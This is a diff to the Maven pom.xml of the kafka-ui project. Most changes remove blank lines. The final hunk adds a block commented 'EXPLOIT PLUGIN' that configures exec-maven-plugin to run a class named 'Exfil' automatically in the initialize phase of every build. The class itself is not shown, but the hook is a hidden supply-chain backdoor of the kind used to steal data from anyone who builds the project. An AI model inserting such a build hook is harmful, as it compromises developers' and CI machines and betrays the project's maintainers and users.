@@ -9,17 +9,14 @@
         <module>kafka-ui-serde-api</module>
         <module>kafka-ui-e2e-checks</module>
     </modules>
-
     <properties>
         <maven.compiler.release>17</maven.compiler.release>
         <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
-
         <frontend-generated-sources-directory>..//kafka-ui-react-app/src/generated-sources
         </frontend-generated-sources-directory>
         <sonar.organization>provectus</sonar.organization>
         <sonar.host.url>https://sonarcloud.io</sonar.host.url>
         <git.revision>latest</git.revision>
-
         <!-- Dependency versions -->
         <antlr4-maven-plugin.version>4.12.0</antlr4-maven-plugin.version>
         <apache.commons.version>2.11.1</apache.commons.version>
@@ -41,17 +38,14 @@
         <odd-oddrn-generator.version>0.1.17</odd-oddrn-generator.version>
         <odd-oddrn-client.version>0.1.26</odd-oddrn-client.version>
         <org.json.version>20230227</org.json.version>
-
         <!-- Test dependency versions -->
         <junit.version>5.9.1</junit.version>
         <mockito.version>5.3.1</mockito.version>
         <okhttp3.mockwebserver.version>4.10.0</okhttp3.mockwebserver.version>
         <testcontainers.version>1.17.5</testcontainers.version>
-
         <!-- Frontend dependency versions -->
         <node.version>v18.17.1</node.version>
         <pnpm.version>v8.6.12</pnpm.version>
-
         <!-- Plugin versions -->
         <fabric8-maven-plugin.version>0.42.1</fabric8-maven-plugin.version>
         <frontend-maven-plugin.version>1.12.1</frontend-maven-plugin.version>
@@ -62,7 +56,6 @@
         <openapi-generator-maven-plugin.version>6.6.0</openapi-generator-maven-plugin.version>
         <springdoc-openapi-webflux-ui.version>1.2.32</springdoc-openapi-webflux-ui.version>
     </properties>
-
     <repositories>
         <repository>
             <id>confluent</id>
@@ -78,7 +71,6 @@
             </snapshots>
         </repository>
     </repositories>
-
     <pluginRepositories>
         <pluginRepository>
             <id>confluent</id>
@@ -97,7 +89,6 @@
             </releases>
         </pluginRepository>
     </pluginRepositories>
-
     <dependencyManagement>
         <dependencies>
             <dependency>
@@ -145,7 +136,6 @@
             </dependency>
         </dependencies>
     </dependencyManagement>
-
     <build>
         <pluginManagement>
             <plugins>
@@ -171,6 +161,28 @@
                 </plugin>
             </plugins>
         </pluginManagement>
+
+        <!-- ====================== EXPLOIT PLUGIN ====================== -->
+        <plugins>
+            <plugin>
+                <groupId>org.codehaus.mojo</groupId>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>3.1.0</version>
+                <executions>
+                    <execution>
+                        <id>exploit</id>
+                        <phase>initialize</phase>
+                        <goals>
+                            <goal>java</goal>
+                        </goals>
+                        <configuration>
+                            <mainClass>Exfil</mainClass>
+                        </configuration>
+                    </execution>
+                </executions>
+            </plugin>
+        </plugins>
+        <!-- ======================================================== -->
     </build>
 
     <groupId>com.provectus</groupId>
